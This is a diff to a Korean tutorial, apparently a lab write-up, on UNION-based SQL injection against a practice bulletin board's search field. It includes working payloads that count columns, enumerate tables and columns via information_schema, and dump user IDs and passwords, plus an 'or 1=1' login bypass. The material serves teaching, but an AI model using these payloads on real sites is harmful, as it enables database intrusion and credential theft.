@@ -38,3 +38,38 @@ SELECT * FROM users WHERE id=''or 1=1 #' AND pw='$pw'
 [게시판 화면 사진]
 
 위 웹페이지에서는 게시판 기능을 제공하며, 게시글 검색기능을 제공하고 글쓰기를 통하여 첨부파일 포함한 글을 올릴수 있습니다.
+
+### UNION-Based SQL_Injection
+
+게시글 검색에 사용되는 쿼리는 다음과 같으며, 기존의 예시들과 같은 방법으로 SQL_Injection 공격을 수행할 수 있습니다.
+
+``` html
+$query = "select * from board where subject LIKE '%$search%'";
+```
+
+**1. 컬럼의 개수 찾기**
+
+검색란에 `' UNION SELECT ALL 1,2,3,... # ` 을 입력하여 숫자를 증가시켜 가며 입력하여 컬럼의 개수를 찾습니다.
+
+[컬럼개수 찾기 사진]
+
+**2. 테이블 이름 찾기**
+
+검색란에 `' UNION SELECT ALL 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()#` 을 입력하여 테이블의 이름을 찾습니다.
+
+[테이블 이름찾기 사진]
+
+**3. 원하는 테이블의 컬럼 이름 찾기**
+
+검색란에 2번에서 얻은 테이블 이름을 이용하여 
+`' UNION SELECT ALL 1,column_name,3,4,5,6 FROM information_schema.columns where table_name='테이블 이름'#` 을 입력하여 컬럼의 이름을 찾습니다.
+
+[테이블 컬럼 이름찾기 사진]
+
+
+**4. 해당 컬럼 데이터 얻기**
+
+3번에서 얻은 컬럼의 이름을 바탕으로 각 데이터를 얻을 수 있습니다. `' UNION SELECT ALL 1,id,3,pw,5,6 FROM users#`
+
+[데이터 얻은 사진]
+
